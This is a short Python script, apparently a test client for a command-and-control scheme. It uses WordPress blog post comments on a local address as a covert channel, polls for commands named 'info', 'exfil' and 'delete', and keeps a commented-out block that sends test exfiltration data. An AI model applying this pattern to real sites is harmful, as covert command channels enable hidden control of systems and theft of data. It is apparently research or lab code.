#!/usr/bin/env python3

from wpc2 import *
import datetime
import random
import sys

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

commands = [ "info", "exfil", "delete" ]

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

recv_config = ReceiveConfig()
recv_config.recv_time_slot = 10
recv_config.process_time_slot = 20
recv_config.prev_unapproved_index = 0

btm_send_config= SendConfig()
btm_send_config.send_time_slot = 30
btm_send_config.confirm_time_slot = 50

loop_counter = 99
recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
while(loop_counter > 0):
    received_data = receive_data(channel, 1, recv_config)
    recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    for command in received_data:
        print("## Received command: " + command)

    loop_counter -= 1

# message = Message()
# message.message_id = generate_random_string(10)
# message.message = message.message_id + ": Exfiltrated Data Test"
# send_data(channel, message, btm_send_config)
